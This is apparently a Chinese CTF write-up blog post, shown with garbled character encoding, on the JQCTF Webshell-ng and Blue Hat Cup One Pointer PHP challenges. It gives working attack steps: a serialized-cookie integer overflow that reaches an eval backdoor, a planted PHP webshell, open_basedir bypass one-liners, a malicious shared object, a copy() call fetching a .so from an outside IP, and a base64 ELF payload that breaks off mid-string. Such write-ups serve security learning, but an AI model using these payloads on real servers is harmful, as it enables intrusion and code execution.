ä¸»é€»è¾‘</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_ invoke__">run</span>(<span class="attr">func</span>: <span class="keyword">callable</span>):</span><br></pre></td></tr></table></figure><p>å‡½æ•°çš„å®šä¹‰å°±æ•´äº†æ³¢å¤§çš„,æœäº†ä¸€ä¸‹æ‰çŸ¥é“å°†å›è°ƒå‡½æ•°ä½œä¸ºå‚æ•°ä¼ å…¥runå‡½æ•°.æ‡‚äº†æ‡‚äº†ğŸ˜ŠğŸ˜ŠğŸ˜Š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">code, data = func()</span><br><span class="line">code = code.replace(<span class="string">&quot;\n\n&quot;</span>, <span class="string">&quot;\n&quot;</span>)</span><br><span class="line">code = code.split(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">code = <span class="built_in">map</span>(<span class="keyword">lambda</span> x: x.split(<span class="string">&quot; &quot;</span>), code)</span><br><span class="line">code = itertools.chain.from_iterable(code)</span><br><span class="line">code = <span class="built_in">map</span>(name_convert, code)</span><br><span class="line">code = <span class="built_in">list</span>(code)</span><br><span class="line">code = &#123;k: code[k] <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(code))&#125;</span><br><span class="line">data = data_convert(data)</span><br><span class="line">code = code | data</span><br><span class="line">res = requests.post(URL, data=code)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><p>ç„¶åå°±æœ‰äº†è¿™ä¹ˆä¸€äº›ä¸œè¥¿,code dataçš„å€¼æš‚ä¸”å…ˆæ”¾ä¸€ä¸‹ä¸åˆ†æ.</p><p>ä¸»è¦çœ‹çœ‹map,ç›¸å½“äºå†™äº†ä¸ªä¸€ä¸ªç®€æ´çš„å¾ªç¯,æˆ‘ä»¬éƒ½çŸ¥é“,<code>lambda</code>ä¸€èˆ¬éƒ½è¡¨ç¤ºåŒ¿åå‡½æ•°,ç”¨åœ¨mapé‡Œé¢,å¯ä»¥å†™ä¸€äº›ç®€å•çš„æ“ä½œé€»è¾‘.</p><p>æ‰§è¡Œä»¥åä¼šè¿”å›map,itertools.chain.from_iterable<code>æ˜¯ Python æ ‡å‡†åº“ä¸­</code>itertools` æ¨¡å—æä¾›çš„ä¸€ä¸ªå‡½æ•°ï¼Œç”¨äºå°†å¤šä¸ªå¯è¿­ä»£å¯¹è±¡è¿æ¥æˆä¸€ä¸ªå•ä¸€çš„è¿­ä»£å™¨.</p><p>ç„¶ååˆç”¨äº†ä¸€æ¬¡map,è¿›è¡Œname_convertæ“ä½œ,è¿™é‡Œä¸»è¦å°±æ˜¯è¿›è¡Œä¸€äº›åè¯æ›¿æ¢.</p><p>listå°±æ˜¯å°†è¿­ä»£å™¨è½¬æ¢æˆåˆ—è¡¨.</p><p>ç„¶åè½¬æ¢æˆå¯¹è±¡,å’Œé¢˜ç›®çš„æ•°å­—å¯¹åº”.</p><p><img src="/2023/12/04/JQCTF-Webshell-ng/1701656438693.png" alt="1701656438693"></p><p>è¿™æ ·å¤§ä½“ä¸Šçš„åŠŸèƒ½å°±å®ç°äº†,æ¥ä¸‹æ¥å°±æ˜¯ä¼ å…¥å‚æ•°äº†.</p><h2 id="å‚æ•°å¤„ç†"><span id="å‚æ•°å¤„ç†"> å‚æ•°å¤„ç†</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data = data_convert(data)</span><br></pre></td></tr></table></figure><p>dataå°±æ˜¯ä¸€äº›å…·ä½“å‡½æ•°çš„å‚æ•°çš„å®ç°</p><p>çœ‹çœ‹data_convertå‡½æ•°</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">data_convert</span>(<span class="params">data: <span class="built_in">dict</span></span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">flatten</span>(<span class="params">something</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(something, (<span class="built_in">list</span>, <span class="built_in">range</span>)):</span><br><span class="line">            <span class="keyword">for</span> sub <span class="keyword">in</span> something:</span><br><span class="line">                <span class="keyword">yield</span> <span class="keyword">from</span> flatten(sub)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> something</span><br><span class="line"></span><br><span class="line">    l = []</span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> data:</span><br><span class="line">        l.append(data_item(k, data[k]))</span><br><span class="line">    l = flatten(l)</span><br><span class="line">    <span class="keyword">return</span> &#123;k[<span class="number">0</span>]: k[<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> l&#125;</span><br></pre></td></tr></table></figure><p>ä¸»è¦çœ‹<code>data_item</code>,è¿™é‡Œä¼šéå†å­—å…¸data,å¹¶æŠŠkeyå’Œvalueä¼ å…¥<code>data_item</code>.</p><p>é‡ç‚¹æ˜¯çœ‹ä¸€ä¸‹å¯¹åˆ—è¡¨çš„å¤„ç†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">data_item</span>(<span class="params">key: <span class="built_in">str</span>, value: <span class="built_in">int</span> | <span class="built_in">str</span> | <span class="built_in">dict</span> | <span class="built_in">list</span></span>):</span><br><span class="line">       <span class="keyword">if</span> <span class="built_in">type</span>(value) == <span class="built_in">int</span>:</span><br><span class="line">           <span class="keyword">return</span> [(key, value)]</span><br><span class="line">       <span class="keyword">elif</span> <span class="built_in">type</span>(value) == <span class="built_in">str</span>:</span><br><span class="line">           <span class="keyword">return</span> [(key, value)]</span><br><span class="line">       <span class="keyword">elif</span> <span class="built_in">type</span>(value) == <span class="built_in">bytes</span>:</span><br><span class="line">           <span class="keyword">return</span> [(key, value)]</span><br><span class="line">       <span class="keyword">elif</span> <span class="built_in">type</span>(value) == <span class="built_in">dict</span>:</span><br><span class="line">           new = []</span><br><span class="line">           <span class="keyword">for</span> k <span class="keyword">in</span> value:</span><br><span class="line">               new.append(data_item(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>[<span class="subst">&#123;k&#125;</span>]&quot;</span>, value[k]))</span><br><span class="line">           <span class="keyword">return</span> new</span><br><span class="line">       <span class="keyword">elif</span> <span class="built_in">type</span>(value) == <span class="built_in">list</span>:</span><br><span class="line">           new = []</span><br><span class="line">           <span class="keyword">if</span> <span class="built_in">len</span>(value) == <span class="number">0</span>:</span><br><span class="line">               new.append((<span class="string">&quot;array[]&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">           <span class="keyword">else</span>:</span><br><span class="line">               <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(value)):</span><br><span class="line">                   new.append(data_item(<span class="string">f&quot;<span class="subst">&#123;key&#125;</span>[<span class="subst">&#123;k&#125;</span>]&quot;</span>, value[k]))</span><br><span class="line">           <span class="keyword">return</span> new</span><br><span class="line">       <span class="keyword">raise</span> Exception(<span class="string">&quot;unsupported type&quot;</span>)</span><br></pre></td></tr></table></figure><p>å‰é¢çš„ç±»å‹æ— å…³ç´§è¦.å½“ä¼ å…¥åˆ—è¡¨çš„æ—¶å€™,ä¼šå†æ¬¡é€’å½’è°ƒç”¨data_item,</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;mysqli_arg&quot;</span>: [<span class="string">&quot;127.0.0.1:3306&quot;</span>, <span class="string">&quot;web&quot;</span>, <span class="string">&quot;web&quot;</span>, <span class="string">&quot;web&quot;</span>],</span><br></pre></td></tr></table></figure><p>è¯¥åˆ—è¡¨ä¼šæŒ‰ç…§ç´¢å¼•,ä¸€ä¸ªä¸ªè½¬å˜æˆ<code>mysqli_arg[k]:value</code></p><p>è¿™æ ·å­å°±å·§å¦™åœ°å®ç°äº†phpä¸­æ•°ç»„çš„ä¼ å‚,ä»è€Œå®Œæˆä¸€äº›éœ€è¦æ•°ç»„ä½œä¸ºå‚æ•°çš„å‡½æ•°çš„è°ƒç”¨.</p><h2 id="yield"><span id="yield"> yield</span></h2><p><img src="/2023/12/04/JQCTF-Webshell-ng/1701657489001.png" alt="1701657489001"></p><p>ç„¶åè¿˜éœ€è¦<code>flatten</code>å¤„ç†,å› ä¸º<code>data_item</code>è¿”å›çš„æ˜¯ä¸€ä¸ªåˆä¸€ä¸ªåˆ—è¡¨åµŒå¥—ç€å…ƒç»„çš„é”®å€¼å¯¹,</p><p><code>yield</code> æ˜¯ Python ä¸­ç”¨äºå®šä¹‰ç”Ÿæˆå™¨å‡½æ•°çš„å…³é”®å­—ã€‚ç”Ÿæˆå™¨å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°ï¼Œå…¶æ‰§è¡Œè¿‡ç¨‹å¯ä»¥åœ¨æ¯æ¬¡è°ƒç”¨æ—¶è¢«æŒ‚èµ·ï¼Œå¹¶ä¸”åœ¨ä¸‹ä¸€æ¬¡è°ƒç”¨æ—¶ä»æŒ‚èµ·çš„ä½ç½®ç»§ç»­æ‰§è¡Œã€‚è¿™å…è®¸ä½ æŒ‰éœ€ç”Ÿæˆä¸€ç³»åˆ—å€¼ï¼Œè€Œä¸å¿…ä¸€æ¬¡æ€§ç”Ÿæˆæ‰€æœ‰å€¼ï¼Œä»è€Œåœ¨å¤„ç†å¤§é‡æ•°æ®æ—¶èŠ‚çœå†…å­˜ã€‚</p><p>ğŸ‘´ä¸å–œæ¬¢åºŸè¯,ğŸ‘´ç®€å•è¯´ä¸€ä¸‹æœ‰å•¥æ„æ€</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flatten</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(something, (<span class="built_in">list</span>, <span class="built_in">range</span>)):</span><br><span class="line">        <span class="keyword">for</span> sub <span class="keyword">in</span> something:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> flatten(sub)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">yield</span> something</span><br></pre></td></tr></table></figure><p>ç»è¿‡yieldå¤„ç†åç”Ÿæˆä¸€ä¸ªå¯¹è±¡,è¯¥å¯¹è±¡åœ¨æ¯æ¬¡è¿­ä»£çš„æ—¶å€™,è¿”å›å€¼ä»yieldå‡ºç°çš„æ¬¡åºä¾æ¬¡è¿”å›.</p><p>æ¯”å¦‚è¯´</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[[(<span class="string">&#x27;mysqli_connect&#x27;</span>, <span class="string">&#x27;mysqli_connect&#x27;</span>)], [[(<span class="string">&#x27;mysqli_arg[0]&#x27;</span>, <span class="string">&#x27;127.0.0.1:3306&#x27;</span>)], [(<span class="string">&#x27;mysqli_arg[1]&#x27;</span>, <span class="string">&#x27;web&#x27;</span>)], [(<span class="string">&#x27;mysqli_arg[2]&#x27;</span>, <span class="string">&#x27;web&#x27;</span>)], [(<span class="string">&#x27;mysqli_arg[3]&#x27;</span>, <span class="string">&#x27;web&#x27;</span>)]], [(<span class="string">&#x27;query_arg&#x27;</span>, <span class="string">&#x27;show tables&#x27;</span>)]]</span><br></pre></td></tr></table></figure><p>é¦–å…ˆé€‰å–ç¬¬ä¸€ä¸ªåˆ—è¡¨,è¿›å…¥if</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[(<span class="string">&#x27;mysqli_connect&#x27;</span>, <span class="string">&#x27;mysqli_connect&#x27;</span>)]</span><br></pre></td></tr></table></figure><p>ç„¶åé€šè¿‡yield å†æ¬¡è¿›å…¥flatten,</p><p>ç„¶åç»§ç»­éå†è¯¥åˆ—è¡¨æ­¤æ—¶åªæœ‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="string">&#x27;mysqli_connect&#x27;</span>, <span class="string">&#x27;mysqli_connect&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ä¸æ»¡è¶³ifæ¡ä»¶,ç›´æ¥è¿›å…¥yield,è¿›è¡Œè¿”å›,åŒæ—¶è®°å½•ä¸‹ç¬¬ä¸€ä¸ªyield.</p><p>åé¢åœ¨è¿›è¡Œè¿­ä»£çš„æ—¶å€™,ç¬¬ä¸€æ¬¡å°±ä¼šè¿”å›è¿™ä¸ªyield.</p><p>äºæ˜¯å°±èƒ½å¤Ÿå°†æ‰€æœ‰åµŒå¥—çš„åˆ—è¡¨å…¨éƒ¨å»æ‰,å±•æˆä¸€ç»´çš„å†…å®¹.</p><p>å°demoå¦‚ä¸‹:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">flatten</span>(<span class="params">something</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(something, (<span class="built_in">list</span>, <span class="built_in">range</span>)):</span><br><span class="line">        <span class="keyword">for</span> sub <span class="keyword">in</span> something:</span><br><span class="line">            <span class="keyword">yield</span> <span class="keyword">from</span> flatten(sub)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">yield</span> something</span><br><span class="line"></span><br><span class="line">ls = [[<span class="string">&#x27;a&#x27;</span>,<span class="number">1</span>,[<span class="string">&#x27;b&#x27;</span>,<span class="string">&quot;c&quot;</span>]],<span class="string">&#x27;ice&#x27;</span>,[<span class="string">&quot;shanghe&quot;</span>],[<span class="string">&#x27;k0reyosh1&#x27;</span>,[<span class="string">&quot;caaaaa&quot;</span>,[<span class="string">&quot;mylife&quot;</span>,<span class="string">&quot;1llustrious&quot;</span>]]]]</span><br><span class="line"></span><br><span class="line">ls1 = flatten(ls)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ls1:</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure><p><img src="/2023/12/04/JQCTF-Webshell-ng/1701659717709.png" alt="1701659717709"></p><p>å¯ä»¥çœ‹åˆ°å°±å°†åµŒå¥—çš„æ‰€æœ‰åˆ—è¡¨å»é™¤æ‰,è¾“å‡ºé‡Œé¢çš„å†…å®¹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> &#123;k[<span class="number">0</span>]: k[<span class="number">1</span>] <span class="keyword">for</span> k <span class="keyword">in</span> l&#125;</span><br></pre></td></tr></table></figure><p>æœ€åè¾“å…¥å…ƒç»„çš„å‰ä¸¤ä¸ªå†…å®¹,æ•´æˆä¸€ä¸ªé”®å€¼å¯¹å­—å…¸</p><p>åé¢åˆå¹¶å­—å…¸,å‘é€è¯·æ±‚.</p><h1 id="é¦–å…ˆæ¥çœ‹çœ‹éå¸¸æŠ½è±¡çš„ä¸€é“æ‡’çŒ«æ¯"><span id="é¦–å…ˆæ¥çœ‹çœ‹éå¸¸æŠ½è±¡çš„ä¸€é“æ‡’çŒ«æ¯"> é¦–å…ˆæ¥çœ‹çœ‹éå¸¸æŠ½è±¡çš„ä¸€é“æ‡’çŒ«æ¯</span></h1><p>è“å¸½æ¯ One Pointer PHP</p><h2 id="æºç é‰´èµä¸€æ³¢"><span id="æºç é‰´èµä¸€æ³¢"> æºç é‰´èµä¸€æ³¢</span></h2><p>add_api.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;user.php&quot;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_COOKIE</span>[<span class="string">&quot;data&quot;</span>]))&#123;</span><br><span class="line"><span class="variable">$count</span>[++<span class="variable">$user</span>-&gt;count]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$count</span>[]=<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$user</span>-&gt;count+=<span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;backdoor&quot;</span>]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$user</span>=<span class="keyword">new</span> <span class="title class_">User</span>;</span><br><span class="line"><span class="variable">$user</span>-&gt;count=<span class="number">1</span>;</span><br><span class="line"><span class="title function_ invoke__">setcookie</span>(<span class="string">&quot;data&quot;</span>,<span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>user.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line"><span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå¦‚æœè¦è¿›eval,å°±ä¸èƒ½è®©<code>$count</code>ä¸­çš„å…ƒç´ ä¸º1,å¯¹æ­¤ç»•è¿‡çš„æ–¹æ³•æ˜¯æ•°ç»„æº¢å‡º.</p><p>32ä½ä¸Šä¸º<code>2147483647</code>ï¼Œ64ä½ä¸Šä¸º<code>9223372036854775807</code>ï¼Œæ‰€ä»¥è¿™é‡Œæˆ‘ä»¬åº”è¯¥è®¾ç½®countä¸º<code>9223372036854775806</code></p><p>æ‰€ä»¥ç›´æ¥æ„é€ åºåˆ—åŒ–,æ‰“è¿›å»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$count</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;count = <span class="number">9223372036854775806</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è°ƒç”¨phpinfo,å‘ç°</p><p><img src="/2023/12/04/JQCTF-Webshell-ng/image-20231208142228538.png" alt="image-20231208142228538"></p><p>ä½¿ç”¨file_put_contentså†™ä¸ªshellè¿›å»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">backdoor=<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/2.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure><h2 id="ç»•è¿‡openbase_dir"><span id="ç»•è¿‡openbase_dir"> ç»•è¿‡openbase_dir</span></h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>å‘ç°åœ¨æ ¹ç›®å½•æœ‰flag,ä½†æ˜¯æ²¡æƒé™è¯».</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">backdoor=<span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;flag&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;/usr/local/etc/php/php.ini&quot;</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è·å–php.iniçš„è®¾ç½®<br>![å±å¹•æˆªå›¾ 2023-12-08 143512](./JQCTF-Webshell-ng/å±å¹•æˆªå›¾ 2023-12-08 143512.png)</p><p>åŠ è½½äº†soæ–‡ä»¶.</p><p>æ‰€ä»¥é€‰æ‹©æ‰“ä¸€ä¸ªè¿œç¨‹fpm</p><h2 id="é¦–å…ˆå‡†å¤‡ä¸€ä¸ªæ¶æ„çš„so"><span id="é¦–å…ˆå‡†å¤‡ä¸€ä¸ªæ¶æ„çš„so"> é¦–å…ˆå‡†å¤‡ä¸€ä¸ªæ¶æ„çš„so</span></h2><p>è„šæœ¬ç©¿ä¸‰ä»£,äººèµ°å®ƒè¿˜åœ¨.ğŸ¤£</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#define _GNU_SOURCE</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">__attribute__</span> ((__constructor__)) <span class="keyword">void</span> <span class="title function_ invoke__">preload</span> (<span class="keyword">void</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">system</span>(<span class="string">&quot;/readflag &gt; /tmp/flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc xxx.c -fPIC -shared -o ext.so</span><br></pre></td></tr></table></figure><p>å†™å…¥tmpç›®å½•,åˆ«äººç”¨çš„æ˜¯è¿œç¨‹è·å–</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">/add_api.php?backdoor=mkdir(<span class="string">&#x27;w0s1np&#x27;</span>);chdir(<span class="string">&#x27;w0s1np&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);chdir(<span class="string">&#x27;..&#x27;</span>);ini_set(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);copy(<span class="string">&#x27;http://47.110.124.239/test/hpdoger.so&#x27;</span>,<span class="string">&#x27;/tmp/hpdoger.so&#x27;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ğŸ‘´å°±ä¸ä¸€æ ·,æ—¢ç„¶file_put_contentsèƒ½ç”¨,ä¸ºå•¥ä¸ç›´æ¥å†™è¿›å».</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents(<span class="string">&#x27;/tmp/ext.so&#x27;</span>,base64_decode(<span class="string">&#x27;f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAAAAAAAAAAAABAAAAAAAAAABA1AAAAAAAAAAAAAEAAOAAJAEAAHAAbAAEAAAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAsAQAAAAAAACwBAAAAAAAAAAQAAAAAAAAAQAAAAUAAAAAEAAAAAAAAAAQAAAAAAAAABAAAAAAAAApAQAAAAAAACkBAAAAAAAAABAAAAAAAAABAAAABAAAAAAgAAAAAAAAACAAAAAAAAAAIAAAAAAAANwAAAAAAAAA3AAAAAAAAAAAEAAAAAAAAAEAAAAGAAAA8C0AAAAAAADwPQAAAAAAAPA9AAAAAAAAIAIAAAAAAAAoAgAAAAAAAAAQAAAAAAAAAgAAAAYAAAAILgAAAAAAAAg+AAAAAAAACD4AAAAAAADAAQAAAAAAAMABAAAAAAAACAAAAAAAAAAEAAAABAAAADgCAAAAAAAAOAIAAAAAAAA4AgAAAAAAACQAAAAAAAAAJAAAAAAAAAAEAAAAAAAAAFDldGQEAAAAOCAAAAAAAAA4IAAAAAAAADggAAAAAAAAJAAAAAAAAAAkAAAAAAAAAAQAAAAAAAAAUeV0ZAYAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAABS5XRkBAAAAPAtAAAAAAAA8D0AAAAAAADwPQAAAAAAABACAAAAAAAAEAIAAAAAAAABAAAAAAAAAAQAAAAUAAAAAwAAAEdOVQBKS0h3+CLDFXjnaMA5IYbDICt6bgAAAAACAAAABgAAAAEAAAAGAAAAAAIAAAAQAAAGAAAAAAAAAG0Sh8IAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAAACAAAAAAAAAAAAAAAAAAAAAAAAAAXQAAABIAAAAAAAAAAAAAAAAAAAAAAAAAAQAAACAAAAAAAAAAAAAAAAAAAAAAAAAALAAAACAAAAAAAAAAAAAAAAAAAAAAAAAARgAAACIAAAAAAAAAAAAAAAAAAAAAAAAAVQAAABIADAAJEQAAAAAAABYAAAAAAAAAAF9fZ21vbl9zdGFydF9fAF9JVE1fZGVyZWdpc3RlclRNQ2xvbmVUYWJsZQBfSVRNX3JlZ2lzdGVyVE1DbG9uZVRhYmxlAF9fY3hhX2ZpbmFsaXplAHByZWxvYWQ